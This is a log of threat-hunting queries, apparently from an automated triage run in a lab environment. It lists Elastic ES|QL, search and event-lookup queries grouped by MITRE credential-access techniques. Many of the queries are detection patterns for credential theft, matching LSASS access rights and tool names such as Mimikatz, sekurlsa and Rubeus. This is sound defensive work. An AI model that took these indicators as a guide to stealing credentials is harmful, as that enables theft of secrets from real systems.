| q-4992a4a08b | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-800fb10c1e | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-638e12a6da | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhp5O"} | None |  |
| q-c6f0e74035 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-1a64257f6e | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-bd06647e43 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-873f6f0da6 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2MI"} | None |  |
| q-942e1038d5 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQvB"} | None |  |
| q-3defa5fda4 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQvB"} | None |  |
| q-1f4c7bcf1f | triage T1552 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog6"} | None |  |
| q-1a71de3876 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYt63"} | None |  |
| q-b5a98dd0b5 | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3Z"} | None |  |
| q-d6b969902f | triage T1552 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTpgCep"} | None |  |
| q-0238cf449b | triage T1555 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None | F33, F34 |
| q-dfc6a34c98 | triage T1555 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-e5ffa35266 | triage T1555 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" \| KEEP @timestamp, user.name, win.ScriptBlockText, _id, _index \| LIMIT 30"} | 30 |  |
| q-5cfef81a5c | triage T1555 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.GrantedAccess IN (\"0x1fffff\",\"0x1f3fff\",\"0x101001\",\"0x1000000\",\"0x3000\") \| KEEP @timestamp, host.name, win.SourceImage, win.TargetImage, win.Grant… | 500 |  |
| q-73d28d049e | triage T1555 step 3 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None | F33, F34 |
| q-c834028b67 | triage T1555 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND win.SourceImage LIKE \"*powershell*\" \| KEEP @timestamp, host.name, win.SourceImage, win.TargetImage, win.GrantedAccess, _i… | 2 | F33 |
| q-261f78fca9 | triage T1555 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*lsass*\" OR TO_LOWER(process.command_line) LIKE \"*credential*\" OR TO_LOWER(process.command_line) LIKE \"*vault*\" OR TO_… | 1 | F35, F36 |
| q-9044420dee | triage T1555 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*credential*\" OR TO_LOWER(file.path) LIKE \"*vault*\" OR TO_LOWER(file.path) LIKE \"*dpapi*\" OR TO_LOWER(file.path) LIKE \"*.kdbx*\… | 0 |  |
| q-84462d0ca3 | triage T1555 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (TO_LOWER(process.command_line) LIKE \"*lsass*\" OR TO_LOWER(process.command_line) LIKE \"*credential*\" OR TO_LOWER(process.command_line) LIKE \"*vault*\" O… | 1 |  |
| q-5bd49ef30b | triage T1555 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*dump*\" OR TO… | 4 | F33 |
| q-ed79b78b63 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-31ed13dd34 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-0c80633796 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-7c1192b5fb | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-4dab82ce30 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTtmJQ5"} | None |  |
| q-a4d9e9b519 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZKhD3z"} | None |  |
| q-4a66857082 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-8265a2e7f2 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8FLV1"} | None |  |
| q-ac1cdba989 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKB-"} | None |  |
| q-2e73799e8c | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-2ca73291a5 | triage T1555 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-d806b2e559 | triage T1556 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 30, "sub_field": "win.GrantedAccess"} | 326 |  |
| q-9b55da3ffd | triage T1556 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" AND TO_LOWER(win.SourceImage) LIKE \"*powershell*\" \| KEEP @timestamp, host.name, win.SourceImage, win.TargetImage, w… | 4 |  |
| q-b0be67e5fb | triage T1556 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-275c98d193 | triage T1556 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sekurlsa*\" O… | 0 |  |
| q-c14ea226af | triage T1556 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.pid == 2976 OR process.pid == 3876) \| KEEP @timestamp, host.name, process.executable, process.command_line, process.parent.executable, user.name, _id, _… | 3 | F37 |
| q-2550ac202b | triage T1556 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4648\" \| KEEP @timestamp, host.name, user.name, process.executable, win.TargetServerName, win.TargetUserName, win.SubjectUserName, _id, _index"} | 15 | F38 |
| q-5de901c8b0 | triage T1556 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*invoke-*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*credential*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*password*… | 20 | F37, F40, F42 |
| q-86dac0207f | triage T1556 step 4 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE event.code == \"7045\" OR event.code == \"7040\" \| KEEP @timestamp, host.name, win.ServiceName, win.ImagePath, win.ServiceType, win.StartType, _id, _index"} | 9 |  |
| q-83cf5da312 | triage T1556 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" AND win.GrantedAccess IN (\"0x1fffff\",\"0x1f3fff\",\"0x101001\",\"0x3000\") \| KEEP @timestamp, host.name, win.Source… | 8 | F37 |
| q-294b04b1cf | triage T1556 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND (TO_LOWER(registry.path) LIKE \"*lsa*\" OR TO_LOWER(registry.path) LIKE \"*notification packages*\" OR TO_LOWER(registry.path) LIKE \"*networkprovider*\" OR TO_L… | 30 | F41, F43 |
| q-a1890b0434 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-fec1f7ed10 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-8972eea7c5 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-a378e8d5ed | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-2e3695d9fd | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhZrj"} | None |  |
| q-f122ec5530 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaKXhpQ"} | None |  |
| q-3fcb452328 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-9e3eb84d96 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-6046ad9cfd | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTqhQkl"} | None |  |
| q-becb970b18 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTmc1_j"} | None |  |
| q-8975feddc1 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlFBP"} | None |  |
| q-b93ea8a7bc | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOhMXxP"} | None |  |
| q-dca5b8c0a8 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLh6MG"} | None |  |
| q-dcf7815156 | triage T1556 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOpVKkY"} | None |  |
| q-e98a521e65 | triage T1557 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" \| KEEP @timestamp, source.ip, destination.ip, destination.port, zeek.orig_l2_addr, zeek.resp_l2_addr, zeek.service, zeek.conn_state, _id, _index \| SORT @timestamp ASC \|… | 50 | F46 |
| q-84c61d2ba8 | triage T1557 step 1 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" \| STATS cnt = COUNT(*) BY zeek.orig_l2_addr, source.ip \| SORT cnt DESC \| LIMIT 50"} | 3 |  |
| q-addd2399a8 | triage T1557 step 2 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND zeek.orig_l2_addr == \"fc:bd:67:e1:a9:c1\" \| KEEP @timestamp, source.ip, destination.ip, destination.port, zeek.orig_l2_addr, zeek.resp_l2_addr, zeek.service, zeek.co… | 44 |  |
| q-5530ab9812 | triage T1557 step 2 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" \| STATS cnt = COUNT(*) BY zeek.resp_l2_addr, destination.ip \| SORT cnt DESC \| LIMIT 50"} | 6 |  |
| q-bf8a07fb88 | triage T1557 step 3 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND source.ip == \"10.0.1.4\" \| STATS cnt = COUNT(*), min_t = MIN(@timestamp), max_t = MAX(@timestamp) BY zeek.orig_l2_addr \| SORT cnt DESC"} | 2 |  |
| q-129a6a2518 | triage T1557 step 3 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"dns\" \| KEEP @timestamp, source.ip, destination.ip, zeek.query, zeek.answers, zeek.rcode_name, _id, _index \| SORT @timestamp ASC \| LIMIT 60"} | 53 |  |
| q-351078875e | triage T1557 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action IN (\"smb_files\", \"smb_mapping\", \"notice\", \"kerberos\") \| KEEP @timestamp, event.action, source.ip, destination.ip, zeek.filename, zeek.path, zeek.share_type, zeek.note, zeek.m… | 60 |  |
| q-8ff3c984c9 | triage T1557 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"conn\" AND zeek.orig_l2_addr == \"fc:bd:67:e1:a9:c1\" \| STATS cnt = COUNT(*) BY destination.port, zeek.service \| SORT cnt DESC"} | 7 |  |
| q-bbaeea90e1 | triage T1557 step 5 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None | F44, F45, F47 |
| q-cac21f1df8 | triage T1557 step 5 | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None | F44, F45, F47 |
| q-3d0ba71eef | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-a3c4faa3c7 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-5fcfb93921 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-136778f8b2 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-a455e4185d | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-3ddbd40ee4 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-e04267d06f | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-c1033306ba | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-baa9d5c942 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-352131dc8e | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrohz"} | None |  |
| q-ec0945d277 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-014ad64a38 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNn1uOFchItY1uwPj"} | None |  |
| q-f94aaa6a69 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjn"} | None |  |
| q-e2248910a6 | triage T1558 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000)", "time_from": null, "time… | 9 |  |
| q-6362ca7813 | triage T1558 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None | F49 |
| q-5280a17603 | triage T1558 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*kerberos* OR process.command_line:*ticket* OR process.command_line:*krbtgt* OR process.command_line:*Invoke-* OR process.command_line:*Rubeus* OR pr… | 2 |  |
| q-14c986fb32 | triage T1558 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| KEEP @timestamp, host.name, win.ScriptBlockId, win.ScriptBlockText, _id, _index \| LIMIT 30"} | 30 |  |
| q-f13e7af430 | triage T1558 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None | F48 |
| q-4a6631429e | triage T1558 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None | F48 |
| q-a9f6b46f0d | triage T1558 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"kerberos\" \| KEEP @timestamp, source.ip, destination.ip, zeek.request_type, zeek.client, zeek.service, zeek.success, zeek.error_msg, _id, _index \| LIMIT 40"} | 35 | F50, F51, F52 |
| q-953dcff469 | triage T1558 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4672\" \| STATS c = COUNT(*) BY win.TargetUserName, host.name \| SORT c DESC \| LIMIT 20"} | 3 |  |
| q-a599cdb2c3 | triage T1558 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4769\" \| STATS c = COUNT(*) BY win.ServiceName, win.TargetUserName \| SORT c DESC \| LIMIT 20"} | 8 |  |
| q-36e5613152 | triage T1558 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND win.TargetUserName LIKE \"*pbeesly*\" \| KEEP @timestamp, host.name, win.TargetUserName, win.LogonType, win.IpAddress, win.LogonProcessName, _id, _index \| L… | 20 |  |
| q-c6520b3311 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-5436bf856e | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-6c293cc2ae | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-87923b2fc7 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-71a6f0fca2 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-e59ce2a6e9 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-149a4d3af7 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-4cec74916f | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-91239c91c2 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-32a4fb4683 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOaA_"} | None |  |
| q-3d00b81756 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-e736104142 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-645620389c | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-8368e6c333 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjj"} | None |  |
| q-e1fb1087b7 | triage T1558 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjj"} | None |  |
| q-9b0b75c9ce | triage T1606 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND (win.GrantedAccess == \"0x1fffff\" OR win.GrantedAccess == \"0x101001\" OR win.GrantedAccess == \"0x1f3fff\" OR win.GrantedA… | 9 | F53 |
| q-677105d74d | triage T1606 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND file.path LIKE \"*ookie*\" \| KEEP @timestamp, host.name, user.name, process.executable, file.path, _id, _index"} | 1 | F53, F54 |
| q-634c870f0f | triage T1606 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-f8d6d5ee8c | triage T1606 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-c5aa226cb0 | triage T1606 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index \| LIMIT 30"} | 30 |  |
| q-6a70ef0189 | triage T1606 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None | F53 |
| q-eab3041e29 | triage T1606 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.command_line LIKE \"*lsass*\" OR process.command_line LIKE \"*Invoke-Mimikatz*\" OR process.command_line LIKE \"*sekurlsa*\" OR process.command_line LIKE… | 1 |  |
| q-ed9bd4f8b7 | triage T1606 step 4 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"http\" \| KEEP @timestamp, source.ip, destination.ip, url.original, http.request.method, user_agent.original, _id, _index \| LIMIT 40"} | 40 |  |
| q-a5656af4c4 | triage T1606 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND win.LogonProcessName LIKE \"*NtLmSsp*\" \| KEEP @timestamp, host.name, user.name, win.LogonProcessName, win.LogonType, win.IpAddress, win.TargetUserName, _id… | 1 | F55 |
| q-5890b6aefb | triage T1606 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.executable LIKE \"*powershell*\" \| KEEP @timestamp, host.name, user.name, process.executable, process.command_line, process.parent.executable, _id, _inde… | 12 |  |
| q-3a9f258b6f | triage T1606 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (process.command_line LIKE \"*lsass*\" OR process.command_line LIKE \"*cookie*\" OR process.command_line LIKE \"*saml*\" OR process.command_line LIKE \"*toke… | 0 |  |
| q-942a36b6cd | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-9f390e4283 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-dec271aad7 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-a601bb5183 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-6bf8ca66ff | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-9972b5035a | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-23aa2c6053 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-8d9ae5be58 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FN5"} | None |  |
| q-43dd0625c6 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FN5"} | None |  |
| q-cbd8bae911 | triage T1621 step 1 | search | {"dataset": "windows.other", "query": "event.code:5857 OR event.code:5858 OR event.code:5859 OR event.code:5860 OR event.code:5861", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "user.name", "message", "win.Operation"… | 90 |  |
| q-4f25b42362 | triage T1621 step 1 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4624 OR event.code:4625 OR event.code:4648 OR event.code:4776 OR event.code:4672", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 525 |  |
| q-307765019a | triage T1621 step 1 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-c6a35115b0 | triage T1621 step 1 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 297 |  |
| q-49668a4f61 | triage T1621 step 2 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.TargetUserName", "win.SubjectUserName", "win.LogonType", "win.ProcessName", "win.IpAddress", "win.TargetSer… | 15 | F56 |
| q-68b2f54157 | triage T1621 step 2 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.TargetUserName:pbeesly", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.TargetUserName", "win.SubjectUserName", "win.LogonType", "win.ProcessName", … | 30 |  |
| q-f3ff4a43c2 | triage T1621 step 2 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 40, "sub_field": null} | 447 |  |
| q-501882c0f6 | triage T1621 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*mfa*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*authenticator*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*2fa*\"… | 0 |  |
| q-a5293a2ad8 | triage T1621 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| WHERE TO_LOWER(process.command_line) LIKE \"*dsregcmd*\" OR TO_LOWER(process.command_line) LIKE \"*mfa*\" OR TO_LOWER(process.command_line) LIKE \"*authenticator*\… | 20 |  |
| q-f6f64e01d5 | triage T1621 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| KEEP @timestamp, host.name, win.ScriptBlockText, _id, _index \| LIMIT 15"} | 15 |  |
